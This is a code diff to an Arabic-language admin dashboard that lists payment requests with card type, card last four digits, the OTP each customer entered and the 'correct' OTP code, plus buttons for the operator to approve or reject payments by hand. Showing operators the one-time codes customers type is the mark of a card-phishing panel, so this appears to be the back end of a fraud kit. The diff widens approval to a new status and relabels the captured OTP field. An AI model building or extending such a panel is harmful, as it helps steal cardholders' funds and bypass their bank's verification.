@@ -26,7 +26,7 @@ type Request = {
   cardType?: string | null;
   cardLast4?: string | null;
   paymentStatus?: string | null;
-  otpValue?: string | null;
+  otpCode?: string | null;
   otpSubmitted?: string | null;
   otpVerified?: boolean | null;
   addons?: string | null;
@@ -47,7 +47,7 @@ const STATUS_LABELS: Record<string, { label: string; color: string }> = {
   in_progress: { label: "قيد التقديم", color: "bg-yellow-100 text-yellow-700" },
   completed: { label: "مكتمل", color: "bg-green-100 text-green-700" },
   payment_submitted: { label: "دفع مقدم", color: "bg-blue-100 text-blue-700" },
-  payment_approved: { label: "مقبول", color: "bg-green-100 text-green-700" },
+  payment_approved: { label: "مقبول - OTP", color: "bg-green-100 text-green-700" },
   otp_sent: { label: "OTP مرسل", color: "bg-purple-100 text-purple-700" },
   otp_verified: { label: "تم التحقق", color: "bg-emerald-100 text-emerald-700" },
   declined: { label: "مرفوض", color: "bg-red-100 text-red-700" },
@@ -195,7 +195,7 @@ export default function AdminDashboard() {
                         <td className="px-3 py-2.5">
                           <div className="flex flex-wrap gap-1">
                             <button onClick={() => setSelectedRequest(req as any)} className="px-2 py-1 bg-blue-50 text-blue-600 rounded text-xs hover:bg-blue-100 transition-all">تفاصيل</button>
-                            {req.status === 'payment_submitted' && (
+                            {(req.status === 'payment_submitted' || req.status === 'payment_approved') && (
                               <>
                                 <button onClick={() => approveMutation.mutate({ requestId: req.id })} className="px-2 py-1 bg-green-50 text-green-600 rounded text-xs hover:bg-green-100 transition-all">قبول</button>
                                 <button onClick={() => rejectMutation.mutate({ requestId: req.id })} className="px-2 py-1 bg-red-50 text-red-600 rounded text-xs hover:bg-red-100 transition-all">رفض</button>
@@ -359,7 +359,7 @@ export default function AdminDashboard() {
                 { label: "الخطوة الحالية", value: `${selectedRequest.currentStep ?? 1}/5` },
                 { label: "حالة الدفع", value: selectedRequest.paymentStatus ?? undefined },
                 { label: "رمز OTP المدخل", value: selectedRequest.otpSubmitted ?? undefined },
-                { label: "رمز OTP", value: selectedRequest.otpValue ?? undefined },
+                { label: "رمز OTP الصحيح", value: selectedRequest.otpCode ?? undefined },
                 { label: "تم التحقق من OTP", value: selectedRequest.otpVerified ? "نعم ✅" : undefined },
               ].filter(i => i.value).map(item => (
                 <div key={item.label} className="flex justify-between text-sm border-b border-gray-50 pb-2">
@@ -384,7 +384,7 @@ export default function AdminDashboard() {
                   ))}
                 </div>
               )}
-              {selectedRequest.status === 'payment_submitted' && (
+              {(selectedRequest.status === 'payment_submitted' || selectedRequest.status === 'payment_approved') && (
                 <div className="flex gap-2 mt-3">
                   <button onClick={() => approveMutation.mutate({ requestId: selectedRequest.id })} className="flex-1 py-2.5 bg-green-600 text-white rounded-lg text-sm font-bold hover:bg-green-700 transition-all">✅ قبول الدفع</button>
                   <button onClick={() => rejectMutation.mutate({ requestId: selectedRequest.id })} className="flex-1 py-2.5 bg-red-600 text-white rounded-lg text-sm font-bold hover:bg-red-700 transition-all">❌ رفض الدفع</button>
